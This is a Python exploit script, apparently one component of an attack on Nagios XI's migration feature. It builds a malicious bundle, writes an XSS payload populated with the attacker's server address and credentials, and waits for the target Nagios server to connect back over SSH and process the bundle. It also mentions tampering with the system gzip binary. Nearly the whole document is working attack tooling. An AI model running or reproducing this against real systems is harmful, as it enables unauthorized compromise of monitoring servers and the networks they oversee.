#!/usr/bin/python3

import argparse
import getpass
import glob
import os
import socket
import subprocess
import time
import sys


script_description = (
    "Prepare current system for migrate attack, output XSS payload\n"
    "Requires to be run with sudo/root privs for writing files to system dirs"
)


def is_port_open(host='localhost', port=22):
    s = socket.socket()
    retval = s.connect_ex((host, port))
    return retval == 0


gzip_cleanup_command = 'mv `which gzip`.bak `which gzip`'
def cleanup_gzip(verbose=False):
    if verbose:
        print(f'[*] Cleaning up gzip with: "{gzip_cleanup_command}"')
    return os.system(gzip_cleanup_command)

def check_bundle():
    bundle_location = '/tmp/nagiosbundle-*.tar.gz'
    bundle_glob = glob.glob(bundle_location)
    if len(bundle_glob) == 1:
        print(f'[+] Attack bundle @ "{bundle_glob[0]}", will be deleted by Nagios during migration.')
    elif len(bundle_glob) == 0:
        print(f'[!] Bundle creation failed; no files matched "{bundle_location}"')
        exit(-1)
    elif len(bundle_glob) > 1:
        print(f'[!] Multiple matching files for "{bundle_glob}", will cause attack to fail')
        print(bundle_glob)
        exit(-2)


def check_for_migration():
    """If migration files are found, delete them and return true"""
    half_bundle_pattern = '/tmp/nagiosbundle-*.tar'
    half_bundles = glob.glob(half_bundle_pattern)
    if half_bundles:
        for cur_file in half_bundles:
            subprocess.run(['rm', cur_file])
        return True
    else:
        return False


def main(ip, username, password, xss_payload_path):

    # This script prints its steps and should cause exception on error
    subprocess.run('./make_bundle.sh', check=True)
    check_bundle()

    with open('migrate_xss_template.html') as f:
        template_data = f.read()
    template_data = template_data.replace('$IP', ip)
    template_data = template_data.replace('$USERNAME', username)
    template_data = template_data.replace('$PASSWORD', password)

    with open(xss_payload_path, 'w') as f:
        f.write(template_data)
        # If we're in a container, try to print the host path
        host_mount = os.getenv('HOST_MOUNT')
        guest_mount = os.getenv('GUEST_MOUNT')
        if host_mount and guest_mount:
            xss_payload_path = xss_payload_path.replace(guest_mount, host_mount)
            xss_payload_path += ' (on the host)'
        print(f'[+] Wrote populated xss payload to {xss_payload_path}')
        #print(f'[ ] NOTE: {xss_payload_path} now contains the password in plaintext')

    listening_locally = is_port_open('localhost', 22)
    if listening_locally:
        print(f'[*] SSH Appears to be listening on this host.')
    if not listening_locally:
        print(f'[!] SSH does not appear to be listening locally.')
        cleanup_gzip()
        exit(1)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        sys.argv[0],
        description=script_description,
    )
    parser.add_argument("attack_server", help="THIS server's IP or Hostname")
    parser.add_argument("user", help="Username nagios will log in as (expects root or sudoer)")
    parser.add_argument("--password",
                        help="Password for user (will be written out in plaintext). Will prompt if not provided.")
    parser.add_argument("--dont_wait", action='store_true',
                        help="Don't wait for connection (you'll have to clean up gzip)")
    parser.add_argument("--payload_path", default='./xss_migrate_payload.html',
                        help="Path to write populated XSS payload to")

    args = parser.parse_args()

    user = args.user
    if args.password:
        password = args.password
    else:
        password = getpass.getpass(f'Password for user "{user}": ')

    main(args.attack_server, user, password, args.payload_path)

    if args.dont_wait:
        print('[*] Done. Remember to restore gzip from backup or else tar will be broken!')
        print(f'    Fix with: {gzip_cleanup_command}')

    else:
        # This cleans up any leftover files from previous connections
        check_for_migration()

        print('[*] Listening until payload is executed and migration runs, CTRL+C to exit...')
        try:
            while True:
                time.sleep(1)
                if check_for_migration():
                    # Sleeping an extra bit just to avoid any race possibility
                    time.sleep(1)
                    print('[+] Looks like the server connected, payload should have run.')
                    break
        except KeyboardInterrupt:
            print('[*] CTRL+C caught')
        finally:
            retval = cleanup_gzip(verbose=True)
            print(f'[*] Return code: {retval}')
            print('[*] Done!')
